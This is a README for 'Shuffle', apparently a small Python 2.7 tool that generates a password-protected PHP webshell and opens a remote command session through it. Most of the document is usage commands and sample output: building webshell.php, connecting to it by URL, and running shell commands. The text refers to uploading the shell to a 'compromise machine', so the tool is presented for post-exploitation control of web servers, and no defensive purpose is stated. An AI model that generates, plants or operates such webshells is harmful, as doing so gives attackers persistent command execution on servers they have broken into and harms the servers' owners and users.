![Shuffle Logo](https://raw.githubusercontent.com/matiasmenares/shuffle/master/extras/logo.png)

[![Code Climate](https://codeclimate.com/github/matiasmenares/Shuffle/badges/gpa.svg)](https://codeclimate.com/github/matiasmenares/Shuffle)

### Version
0.1 (Beta)
### Installation

Only you need is Python 2.7

## Getting started
Shuffle 0.1 (Beta) works with Python 2.7 You can run it with:

```sh
$ python shuffle.py -h
```
Command:
  - -g Generate shell
  - -p Setting Password
  - -u Url to connetec
  
To create a webshell run:
```sh
$ python shuffle.py -g webshell.php -p 123
```
And Webshell generate in shuffle folder.
```sh
~/shuffle/webshell.php
```
### Connecting
When you upload shell to compromise machine only you need is run shell with:

```sh
$ python shuffle.py -u http://localhost/webshell.php -p 123
```

And wait to establish connection...

```sh
#> Conecction Established, Enjoy!

localhost@apache[~]$>
```

Now you can run all command !

```sh
#> Conecction Established, Enjoy!

localhost@apache[~]$> ls
app
lib
index.php
localhost@apache[~]$> 

```
to close the conection type exit.

```sh
#> Conecction Established, Enjoy!

localhost@apache[~]$> exit
bye :)
$ 
```
## Extras
### Banner
if you want change login banner modify this file:
```sh
~/shuffle/extras/banner.txt
```
License
----

MIT

**Free Software, Hell Yeah!**